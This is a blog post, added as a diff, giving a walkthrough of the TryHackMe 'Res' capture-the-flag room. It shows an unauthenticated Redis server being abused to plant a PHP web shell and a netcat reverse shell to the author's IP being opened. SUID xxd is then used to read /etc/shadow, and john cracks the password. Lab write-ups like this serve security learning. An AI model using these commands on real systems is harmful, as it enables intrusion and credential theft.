@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/res_writeup/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="Res_writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/res_writeup/" /><meta property="article:published_time" content="2020-10-07T17:57:40-04:00" />
+
+
+
+<meta name="twitter:title" content="Res_writeup.sh"/>
+<meta name="twitter:description" content="Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!"/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/res_writeup'>res_writeup</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>Res_writeup.sh</h1>
+Oct. 7, 2020
+
+
+<br/><br/>
+<img src="../img/res_cover.gif" alt="Post Cover Gif animation";>
+<br/><br/>
+<h2 id="res---thm-room">Res - THM Room</h2>
+<p>Hello, stranger and welcome to another writeup. This time I went for a fairly new room released on TryHackMe called <code>Res</code>. I hope you enjoy it!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/res">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
+</ul>
+<h3 id="get-set-up">Get set-up</h3>
+<p>I&rsquo;ll be using the following tools during this writeup, that are not installed with Kali by default. Grab and install them before reading further.</p>
+<ul>
+<li><strong>Autorecon</strong> by <strong>Tib3rius</strong>, grab it <a href="https://github.com/Tib3rius/AutoRecon">here</a>.</li>
+<li><strong>redis-cli</strong>: Install by running <code>sudo apt-get install redis-tools</code></li>
+<li><strong>PHP Web Shell</strong>: by <strong>Artyuum</strong>, grab it <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php">here</a>.</li>
+</ul>
+<h3 id="fast-scanning-and-first-room-questions">Fast Scanning and first room questions</h3>
+<p>I fired up <code>Autorecon</code> this time, and start a scan with it. While this ran I looked at what was being served in port <code>80</code>. Just a default apache page.</p>
+<p><img src="https://i.imgur.com/V9F5cK6.png" alt="Apache default page"></p>
+<p>Autorecon also found <code>redis</code> on port <code>6379</code> and we connected using <code>redis-cli</code> and ran a simple <code>info</code> command. With this we want to check if we can run commands without having to authenticate.</p>
+<p><img src="https://i.imgur.com/rKj55Pg.png" alt="Redis - Autorecon"></p>
+<blockquote>
+<p>Note: If Credentials were required we would see something like this <code>NOAUTH Authentication is required.</code></p>
+</blockquote>
+<p>Running that command with <code>redis-cli</code> gives us the necessary information to answer the following room questions:</p>
+<blockquote>
+<p><strong>Question #1:</strong> Scan the machine, how many ports are open?</p>
+</blockquote>
+<blockquote>
+<p><strong>Question #2:</strong> What&rsquo;s is the database management system installed on the server?</p>
+</blockquote>
+<blockquote>
+<p><strong>Question #3:</strong> What port is the database management system running on?</p>
+</blockquote>
+<blockquote>
+<p><strong>Question #4:</strong> What&rsquo;s is the version of the management system installed on the server?</p>
+</blockquote>
+<p>Having those questions answered it is time we move further with compromising the machine.</p>
+<h3 id="finding-our-way-in-and-getting-the-usertxt-flag">Finding our way in and getting the user.txt flag</h3>
+<p>We need to find a way to get access into the machine, looking around for the <code>redis</code> version installed.</p>
+<p>Reading a bit about redis I get that we can set configurations that will be effective without any server restart. This is, settings directories and create files. This is great, we can try to upload some reverse shell possibly as long as we manage to run commands on the machine.</p>
+<p>The first thing we need is a way to set a working directory to the writable path we known it exists <code>/var/www/html</code>. We know this from the default apache page we can see in port <code>80</code>.</p>
+<p>So how do we set a directory in redis? good question. Let' me google about it :laughing:</p>
+<p>It seems all it takes is using the <code>config set dir {path}</code> command, in our case it looks like this: <code>config set dir /var/www/html</code>.</p>
+<p>Let&rsquo;s run that.</p>
+<p><img src="https://i.imgur.com/EjY0h5k.png" alt="redis config set dir"></p>
+<p>It works! Now we need to see how we can create a file there.</p>
+<p>Again this is done in a similar way, using <code>config set dbfilename {file}</code>. We can probably name the file any way we want as long as we upload a supported format.</p>
+<p>I run <code>config set dbfilename shell.php</code> and get another <code>OK</code> back, all went well. Now we need to write to that file so we can get a chance of running commands. After some reading around, it seems we can add a single line to the file that would allow us to run commands from the URL as the apache user <code>www-data</code>. The line for our <code>shell.php</code> file looks like this: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
+<blockquote>
+<p>You can read more about PHP Webshells <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html">here</a>.</p>
+</blockquote>
+<p>We add the line to the file we created with <code>redis-cli</code>, by using the following command: <code>set {filename} &quot;{PHP_One_liner}&quot;</code></p>
+<p>In my case it looks like this:</p>
+<p><img src="https://i.imgur.com/wPL2sfV.png" alt="we set the one-liner to our file"></p>
+<p>after a failed attempt it seems to work. Now we need to test this out. If we did things the way we were supposed to, we should theoretically be able to run commands through the URL. Let&rsquo;s put that to a test, shall we?.</p>
+<p>To do that we need to provide a command like this: <code>{MachineIP}shell.php?cmd=whoami</code></p>
+<p>That didn&rsquo;t work, turns out I forgot an important step (what a surprise!), we need to save the changes in redis-cli by running <code>save</code>.</p>
+<p><img src="https://i.imgur.com/LuK5PD1.png" alt="We re-test our proof of time"></p>
+<p>This time we get some information back, with this we can probably run a reverse shell back to our machine. We can also try to leverage another piece of information we got from the <code>redis-cli info</code> command. If you looked through those results, you should have noticed there was a user directory mentioned:</p>
+<p><img src="https://i.imgur.com/LekQt31.png" alt="There is a vianka user"></p>
+<p>Let&rsquo;s see if we can get the user.txt flag that could very well be inside <code>vianka</code> folder.
+let&rsquo;s say something like this: <code>cat /home/vianka/user.txt</code> we add that to our URL command like this: <code>{MachineIP}/shell.php?cmd=cat /home/vianka/user.txt</code>.</p>
+<p>Let&rsquo;s give that a try:</p>
+<p><img src="https://i.imgur.com/obKEUdI.png" alt="we try to get the user flag"></p>
+<p>It works, we got the first flag. We know how to answer the question/task #5:</p>
+<blockquote>
+<p>Question/Task #5 Compromise the machine and locate user.txt</p>
+</blockquote>
+<p>Let&rsquo;s see how we can find the answer to the next question:</p>
+<blockquote>
+<p>Question #6 What is the local user account password?</p>
+</blockquote>
+<p>We can probably try to cat the <code>etc/shadow</code> file but not sure if that would work. And it did not. Let&rsquo;s try to fire up a python HTTP server on whatever folder you download the <code>php web-shell</code> file (check the get set-up). And let&rsquo;s see if we can run a <code>wget http://10.13.0.34:2112/webshell.php</code></p>
+<p>That works, and if we navigate to <code>/webshell.php</code> we see the webshell loading.</p>
+<p><img src="https://i.imgur.com/YjSjpcG.png" alt="The shell loads"></p>
+<p>Let&rsquo;s see if we can find any SUID, by running <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<p>This could take a bit, but eventually you should see something like this:</p>
+<p><img src="https://i.imgur.com/gv6Z72o.png" alt="we look for SUID"></p>
+<p>We found a nice list of files were there SUID bit is set to run as root. I tried sudo but it did not work. At this point we could keep trying other files from the results, but we really need a better shell. Let&rsquo;s try to get a reverse shell to our kali box. We&rsquo;ll use the webshell we have been leveraging so far.</p>
+<blockquote>
+<p>Make sure to start a netcat listener on the port you want before running the command in the URL.</p>
+</blockquote>
+<p>Let&rsquo;s see if we can get a reverse shell by running in the URL a netcat connection <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 7886 &gt;/tmp/f</code></p>
+<p><img src="https://i.imgur.com/A6FTUrm.png" alt="We run a connection to get reverse shell"></p>
+<p>We got a reverse shell, a really basic shell. Let&rsquo;s see if we can upgrade it to a python TTY by running the following command <code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code></p>
+<p><img src="https://i.imgur.com/mGUqMF0.png" alt="We stabilize the shell a bit">
+Mmm not sure that worked, anyway let&rsquo;s move on.</p>
+<p>Now let&rsquo;s upload linPEAS to see if we can find a way to get root or the password for www-data. Remember to make linpeas executable first <code>chmod +x linpeas.sh</code> after uploading.</p>
+<p><img src="https://i.imgur.com/xy6uGr2.png" alt="Linpeas Results"></p>
+<p>Linpeas found that <code>xxd</code> binary has root permissions, let&rsquo;s see if <code>GTFOBins</code> has a way of exploiting it:</p>
+<blockquote>
+<p>Check out GTFObins <a href="https://gtfobins.github.io/gtfobins/xxd/">here</a></p>
+</blockquote>
+<p>Let&rsquo;s see if we can read <code>etc/shadow</code> by exploiting this file as suggested by GTFOBins</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">LFILE<span style="color:#f92672">=</span>etc/shadow
+xxd <span style="color:#e6db74">&#34;</span>$LFILE<span style="color:#e6db74">&#34;</span> | xxd -r
+</code></pre></div><p><img src="https://i.imgur.com/MI4qViX.png" alt="we managed to read the etc/shadow"></p>
+<p>Let&rsquo;s see if we can use the same method to get the root.txt flag:</p>
+<p><img src="https://i.imgur.com/a6LRnn8.png" alt="we get the root.txt flag the same way"></p>
+<p>Sweet! we got the root flag.</p>
+<blockquote>
+<p>If you want to learn a bit more about the etc/shadow file and how the data in it is formated, check out <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">this</a> post.</p>
+</blockquote>
+<p>Based on that post our hashed password is SHA-512, let&rsquo;s see how we can crack it and finish this room. We also learn from that post that the structure is as follows: <code>$id$salt$hashed</code></p>
+<p>We can try <code>john</code> like this and see if it cracks it. First we need to <code>unshadow</code> the <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a hash. I showed how we used <code>xxd</code> to read the shadow file, in the same way read the contents of passwd file. Save each content to a passwd and a shadow file.</p>
+<p>We do that like this <code>sudo unshadow passwd shadow &gt; hash</code></p>
+<p>we have all those details from the shadow file, so let&rsquo;s run john as follows <code>john hash</code></p>
+<p>After a bit we got the password:</p>
+<p><img src="https://i.imgur.com/ubV8uL7.png" alt="we got the password"></p>
+<p>And that&rsquo;s it for Res room. We managed to compromise redis, used URL commands to get the initial foothold and finally exploited a binary to get the flags, passwd and shadow files and we finished by cracking the password with john to obtain vianka&rsquo;s password.</p>
+<p>It was a fun box, hope you enjoy it. Leave a comment, leave some feedback. Like TheCyberMentor says &ldquo;talk cyber to me&rdquo; :laughing:</p>
+<p>Thank you and Happy hacking!</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
